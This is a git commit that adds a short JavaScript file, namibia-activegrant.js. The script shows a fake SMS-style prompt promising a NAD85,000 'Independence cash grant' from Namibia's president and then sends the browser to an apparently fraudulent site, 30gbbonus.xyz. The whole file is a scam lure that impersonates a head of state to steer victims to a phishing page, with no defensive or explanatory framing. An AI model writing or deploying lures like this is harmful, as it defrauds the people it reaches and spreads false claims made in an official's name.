a279593d27677f436c4939dbb039962e38519bd1
xmasdata <152927198+xmasdata@users.noreply.github.com>
2025-03-17 07:27:35 +0100

    Create namibia-activegrant.js

---
+++ namibia-activegrant.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW CASH '
+password=prompt('SMS: Congratulations, you are eligible to receive the NAD85,000 Independence cash grant from President NETUMBO NANDI-NDAITWAH, click OK to Withdraw Cash. ','WITHDRAW CASH ');
+if (password != 'WITHDRAW CASH ') {
+location.href='https://30gbbonus.xyz/namibia.html';
+}
